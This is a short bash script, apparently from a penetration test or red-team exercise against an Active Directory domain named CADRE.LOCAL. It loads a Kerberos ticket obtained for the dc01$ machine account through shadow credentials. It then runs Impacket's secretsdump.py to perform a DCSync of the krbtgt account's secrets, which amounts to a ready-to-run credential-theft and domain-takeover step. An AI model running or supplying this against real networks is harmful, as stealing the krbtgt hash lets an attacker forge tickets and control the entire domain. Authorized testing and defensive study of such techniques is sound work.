#!/usr/bin/env bash
# T008 follow-through: DCSync using the LDAP TGS from dc01$ shadow-cred TGT
set -u
export KRB5_CONFIG=/tmp/krb5-cadre.conf
export KRB5CCNAME="/tmp/nxc-venv/bin/dc01\$@ldap_dc01.cadre.local@CADRE.LOCAL.ccache"
cd /tmp/nxc-venv/bin
timeout 45 ./secretsdump.py -k -no-pass 'CADRE.LOCAL/dc01$@dc01.cadre.local' -just-dc-user 'CADRE/krbtgt' 2>&1 | tail -14
echo "EXIT=$?"
